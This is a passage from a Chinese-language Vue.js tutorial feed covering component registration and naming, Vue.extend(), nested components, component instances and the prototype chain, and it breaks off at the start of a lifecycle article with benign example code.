</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;h2&gt;{{msg}}&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;/div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    `</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello Vue.js!&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// 2. 注册组件（全局注册）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">Vue</span><span class="p">.</span><span class="nx">component</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">,</span> <span class="nx">hello</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h1 id="组件的使用与命名" data-numberify>组件的使用与命名<a class="anchor ms-1" href="#组件的使用与命名"></a></h1>
<p>组件在使用时，直接以<code>&lt;component-name&gt;</code>的形式使用。切确地说，<code>component-name</code>是组件在注册时传入的<code>key</code>。</p>
<p>如上例中：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;#app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 3. 使用组件 --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hello</span><span class="p">&gt;&lt;/</span><span class="nt">hello</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>其实组件标签可以使用闭合标签的形式编写。如<code>&lt;user&gt;&lt;/user&gt;</code>可以写为<code>&lt;user/&gt;</code>。但是这种用法最好在Vue脚手架中使用。因为不使用脚手架的情况下，闭合标签可能会调职后续组件不能被成功渲染。</p>
<p>关于组件名可以采用以下两种命名方式：</p>
<ul>
<li><strong>kebab-case</strong>（烤肉串式）：用<code>-</code>连接多个单词。</li>
<li><strong>CameCase</strong>（大驼峰命名法，需要Vue脚手架支持）：将每个单词的首字母设为大写形式。</li>
</ul>
<blockquote>
<p>在定义组件名时需要注意：</p>
<ul>
<li>
<p>组件名尽可能回避Html中已有的元素名称（Vue会报错）。</p>
</li>
<li>
<p>可以使用<code>name</code>配置项指定组件在开发者工具中展示的名称。</p>
<p>如上例：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">hello</span> <span class="o">=</span> <span class="nx">Vue</span><span class="p">.</span><span class="nx">extend</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;hello-vue&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">template</span><span class="o">:</span> <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;h2&gt;{{msg}}&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;/div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">  `</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello Vue.js!&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>那么无论组件名被定义成什么，<code>hello</code>组件在Vue开发者工具中展示的都是<code>hello-vue</code>这个名称。</p>
</li>
</ul>
</blockquote>
<hr>
<h1 id="非单文件组件" data-numberify>非单文件组件<a class="anchor ms-1" href="#非单文件组件"></a></h1>
<p>如下是一个组件的示例：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>{{msg}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 3. 编写组件标签 --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">site</span><span class="p">&gt;&lt;/</span><span class="nt">site</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 3. 编写组件标签 --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">user</span><span class="p">&gt;&lt;/</span><span class="nt">user</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 1. 创建site组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">site</span> <span class="o">=</span> <span class="nx">Vue</span><span class="p">.</span><span class="nx">extend</span><span class="p">({</span>  
</span></span><span class="line"><span class="cl">    <span class="nx">template</span><span class="o">:</span> <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;h2&gt;网站名称：{{name}}&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;h2&gt;网站地址：{{url}}&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;/div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    `</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Linner\&#39;s Blog&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;blog.linner.asia&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// 1. 创建user组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">Vue</span><span class="p">.</span><span class="nx">extend</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">template</span><span class="o">:</span> <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;h2&gt;用户姓名：{{name}}&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;h2&gt;用户年龄：{{age}}&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;/div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    `</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">age</span><span class="o">:</span> <span class="mi">18</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello!&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 2. 注册组件（局部注册）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">site</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">user</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="创建组件" data-numberify>创建组件<a class="anchor ms-1" href="#创建组件"></a></h2>
<p>非单文件组件的创建使用的是<code>Vue.extend()</code>方法。</p>
<p><code>Vue.extend()</code>的使用与Vue实例的构造函数（<code>new Vue()</code>）非常类似，它们都需要传入一个配置对象。并且在Vue构造函数的配置对象中使用的大多配置项，在<code>Vue.extend()</code>的配置对象中同样也能使用（如<code>data</code>、<code>methods</code>等）。</p>
<p>但需要注意的是，<code>Vue.extend()</code>的配置对象中不能使用<code>el</code>配置项；并且它的<code>data</code>配置项需要使用函数式来定义，然后通过在<code>data()</code>中<code>return</code>一个对象来作为该组件的<code>data</code>对象。</p>
<p>在定义非单文件组件时，可以将<code>const component = Vue.extend(options)</code>简写为<code>const component = options</code>。</p>
<p>如上，将<code>site</code>：使用简写形式定义：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">site</span> <span class="o">=</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">  <span class="nx">template</span><span class="o">:</span> <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;h2&gt;网站名称：{{name}}&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;h2&gt;网站地址：{{url}}&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;/div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">  `</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Linner\&#39;s Blog&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;blog.linner.asia&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>使用简写形式时，<code>Vue.extend()</code>由<code>vm</code>来调用。</p>
<p><code>Vue.extend()</code>返回的是一个<code>VueComponent()</code>构造函数。并且每次调用<code>Vue.extend()</code>时，返回的都是一个新的<code>VueComponent()</code>。</p>
<p><code>Vue.extend()</code>的部分源码如下。<code>Vue.extend()</code>在每次被调用时，都会定义一个新的<code>VueComponent()</code>。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">extend</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">extendOptions</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// VueComponent() 是在 Vue.extend() 中现场定义的
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">var</span> <span class="nx">Sub</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">VueComponent</span><span class="p">(</span><span class="nx">options</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">_init</span><span class="p">(</span><span class="nx">options</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="cm">/* 对Sub进行一系列处理... */</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">Sub</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><h2 id="组件配置" data-numberify>组件配置<a class="anchor ms-1" href="#组件配置"></a></h2>
<p>使用<code>Vue.extend()</code>创建组件，还需要在配置对象中启用<code>template</code>配置。<code>template</code>的作用是，定义组件的布局结构，也就是组件中可供复用的HTML代码。</p>
<blockquote>
<p>在使用<code>template</code>的时候需要注意，<code>template</code>的内容必须仅包含1个根元素，并且不能使用<code>&lt;template&gt;</code>标签作为根元素。</p>
</blockquote>
<p>使用<code>Vue.extend()</code>的注意项：</p>
<ul>
<li>
<p>组件配置项与Vue实例配置项基本相同。但是<u>在组件配置中，不能使用<code>el</code>配置。</u></p>
<p>组件时作为可以复用的Vue实例，所以它们<u>与根实例（Vue实例）接收的配置项基本相同（包括<code>data</code>、<code>computed</code>、<code>watch</code>、<code>methods</code>、<code>components</code>以及生命周期钩子等）</u>。但是所有的组件最终都要被一个根实例<code>vm</code>所管理，由<code>vm</code>决定它们要服务于哪个容器。并且考虑到组件的复用，所以不使用<code>el</code>，而是使用<code>template</code>来配置可复用的组件模板。</p>
</li>
<li>
<p><u>组件中的<code>data</code>要配置成一个函数。</u></p>
<p>防止一个组件被多次使用时，存在数据的引用关系。<code>data</code>使用函数来定义，可以确保每个组件实例都可以维护一份由<code>data</code>返回对象的独立拷贝。</p>
</li>
</ul>
<h2 id="组件的嵌套" data-numberify>组件的嵌套<a class="anchor ms-1" href="#组件的嵌套"></a></h2>
<p>组件的嵌套使用很简单，直接在组件的配置对象中使用<code>components</code>配置项即可。</p>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;root&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 定义user组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">template</span><span class="o">:</span> <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;h2&gt;用户姓名：{{name}}&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;h2&gt;用户年龄：{{age}}&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;/div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    `</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">age</span><span class="o">:</span> <span class="mi">18</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// 定义site组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">site</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">template</span><span class="o">:</span> <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;h2&gt;网站名称：{{name}}&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;h2&gt;网站地址：{{url}}&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;user&gt;&lt;/user&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;/div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    `</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Linner\&#39;s Blog&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;blog.linner.asia&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 注册组件（局部）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">user</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// 定义hello组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">hello</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">template</span><span class="o">:</span> <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;h1&gt;{{msg}}&lt;/h1&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    `</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello Vue.js&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// 定义app组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">template</span><span class="o">:</span> <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;hello&gt;&lt;/hello&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;hr&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;site&gt;&lt;/site&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;/div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    `</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">hello</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">site</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#root&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">template</span><span class="o">:</span> <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;app&gt;&lt;/app&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    `</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 注册组件（局部）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">components</span><span class="o">:</span> <span class="p">{</span><span class="nx">app</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="组件实例对象" data-numberify>组件实例对象<a class="anchor ms-1" href="#组件实例对象"></a></h2>
<p>在组件的一些配置项中（如<code>data</code>、<code>methods</code>、<code>watch</code>、<code>computed</code>等）的函数，<code>this</code>通常<u>指向的是<code>VueComponent()</code>创建出来的实例对象</u>。而使用<code>new Vue()</code>时，如上的一些配置项中的函数，它们的<code>this</code>通常指向的是Vue实例对象（<code>vm</code>）。</p>
<p>由<code>VueComponent()</code>创建出来的实例对象即为<u>组件实例对象</u>，又可称为<code>VueComponent</code>对象（在代码中可使用缩写形式<code>vc</code>）。</p>
<blockquote>
<p>虽然<code>vc</code>的结构和<code>vm</code>十分相似（<code>vc</code>也使用了数据代理和数据劫持），但是它们是两种不同的对象。</p>
</blockquote>
<p>在使用组件标签时，<u>每一个组件标签都对应着一个组件实例</u>。<u>每一个组件实例都是由它对应的<code>VueComponent()</code>构造函数所创建</u>。</p>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">site</span><span class="p">&gt;&lt;/</span><span class="nt">site</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">user</span><span class="p">&gt;&lt;/</span><span class="nt">user</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">user</span><span class="p">&gt;&lt;/</span><span class="nt">user</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>其中所有的<code>&lt;site&gt;&lt;/site&gt;</code>都对应着一个<code>site</code>组件的<code>VueComponent()</code>构造函数，所有的<code>&lt;user&gt;&lt;/user&gt;</code>都对应着一个<code>user</code>组件的<code>VueComponent()</code>构造函数。也就是说，<u>每一个组件都对应一个<code>VueComponent()</code>构造函数</u>。</p>
<p>而上方的<code>user</code>组件被使用了两次，也就是两个<code>&lt;user&gt;&lt;/user&gt;</code>。其中每一个<code>&lt;user&gt;&lt;/user&gt;</code>都对应着一个使用<code>user</code>的<code>VueComponent()</code>所创建出来的<code>VueComponent</code>对象。也就是说，每使用一次<code>&lt;user&gt;&lt;/user&gt;</code>，Vue都会使用<code>user</code>的<code>VueComponent()</code>创建出来一个组件实例。即<u>每一个组件标签对应着一个组件实例</u>。</p>
<p>当组件被注册时（无论是局部注册还是全局注册），它们都会被<code>vm</code>所管理。并且当组件被使用时，它们的<code>VueComponent</code>对象都会被保存在<code>vm.$children</code>中。</p>
<blockquote>
<p><code>vm.$children</code>是数组类型，保存了实例中使用到的所有<code>VueComponent</code>对象。</p>
</blockquote>
<p>而组件在使用子组件时，同<code>vm</code>一样，会将其保存在当前组件实例对象<code>vc</code>的<code>$children</code>（<code>vc.$children</code>）中。</p>
<hr>
<h1 id="vue-原型链" data-numberify>Vue 原型链<a class="anchor ms-1" href="#vue-原型链"></a></h1>
<p>Vue 的原型链如下：</p>
<p><picture><img class="img-fluid " alt="Vue.js 原型链" src="/docs/vue/components/introduction/1694756873556.png" loading="lazy" width="1440" height="900" />
</picture>

</p>
<p>所以在Vue中，<code>Vue.extend(options).prototype.__proto__ === Vue.prototype</code>（<code>Vue.extend(options)</code>返回的是<code>VueComponent</code>构造函数）。</p>
<hr>
<h1 id="单文件组件" data-numberify>单文件组件<a class="anchor ms-1" href="#单文件组件"></a></h1>
<blockquote>
<p>单文件组件请查看 <a href="../vue-projects/">Vue 项目开发</a>。</p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 生命周期</title>
      <link>/docs/vue/single-instance/life-cycle/</link>
      <pubDate>Wed, 13 Sep 2023 07:16:05 +0000</pubDate>
      
      <guid>/docs/vue/single-instance/life-cycle/</guid>
      <description><![CDATA[Vue生命周期指的是Vue实例或Vue组件实例在创建时经历的一系列初始化步骤。 在这个过程中Vue为用户提供了一些可供用户自定义的函数，即生命]]></description>
      <content:encoded><![CDATA[<p>Vue生命周期指的是Vue实例或Vue组件实例在创建时经历的一系列初始化步骤。</p>
<p>在这个过程中Vue为用户提供了一些可供用户自定义的函数，即生命周期回调函数。这些函数又称为生命周期函数或生命周期钩子。</p>
<hr>
<h1 id="生命周期图示" data-numberify>生命周期图示<a class="anchor ms-1" href="#生命周期图示"></a></h1>
<p>Vue组件的生命周期图示如下：</p>
<p><picture><img class="img-fluid " alt="Vue.js 生命周期" src="/docs/vue/single-instance/life-cycle/1694591410572.png" loading="lazy" width="1266" height="2002" />
</picture>

</p>
<p>下图是尚硅谷天禹所给的有关Vue生命周期的解释：</p>
<p><picture><img class="img-fluid " alt="Vue.js 生命周期解释" src="/docs/vue/single-instance/life-cycle/1694591763923.png" loading="lazy" width="1469" height="1892" />
</picture>

</p>
<hr>
<h1 id="生命周期函数" data-numberify>生命周期函数<a class="anchor ms-1" href="#生命周期函数"></a></h1>
<p>生命周期函数本质是Vue在生命周期过程中的某些关键时刻帮用户调用的一些特殊名称的函数。</p>
<p>生命周期函数的名字不可更改，但函数的具体内容由程序员根据需求编写。</p>
<p>生命周期函数中的<code>this</code>指向的是当前的Vue实例或当前组件的实例对象。</p>
<p>下方代码演示了Vue生命周期函数：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- &lt;h2 v-text=&#34;num&#34;&gt;&lt;/h2&gt; --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>Current Number：{{num}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;add&#34;</span><span class="p">&gt;</span>Number+1<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
